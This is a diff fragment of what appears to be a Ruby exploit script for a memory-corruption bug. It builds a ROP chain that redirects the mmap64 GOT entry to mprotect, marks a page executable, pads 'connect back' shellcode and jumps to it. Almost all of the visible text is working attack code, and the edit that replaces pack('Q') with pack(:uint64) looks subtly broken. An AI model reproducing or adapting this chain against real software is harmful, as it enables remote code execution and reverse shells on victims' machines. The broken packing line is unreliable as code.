@@ -19,15 +19,15 @@ add_rdi_al = 0x00462de4
 
 # change mmap64 to mprotect, easier to find gadget
 $ropchain = [
-    poprax, 0x60,
-    poprdi, mmapgot,
-    add_rdi_al,
-    
-    poprax, mmapgot,
-    poprdx, 0x7,
-    poprsi, 0x1000,
-    poprdi, mmapaddr,
-    mmap64
+  poprax, 0x60,
+  poprdi, mmapgot,
+  add_rdi_al,
+
+  poprax, mmapgot,
+  poprdx, 0x7,
+  poprsi, 0x1000,
+  poprdi, mmapaddr,
+  mmap64
 ].pack("Q*")
 
 #connect back shellcode x64
@@ -49,7 +49,7 @@ $shellcode << ("\x90" * (8 - ($shellcode.length % 8)))
 }
 
 # finally jump to it
-$ropchain << mmapaddr.pack("Q") 
+$ropchain << mmapaddr.pack(:uint64) 
 
 # payload for crash
 $payload = [ 
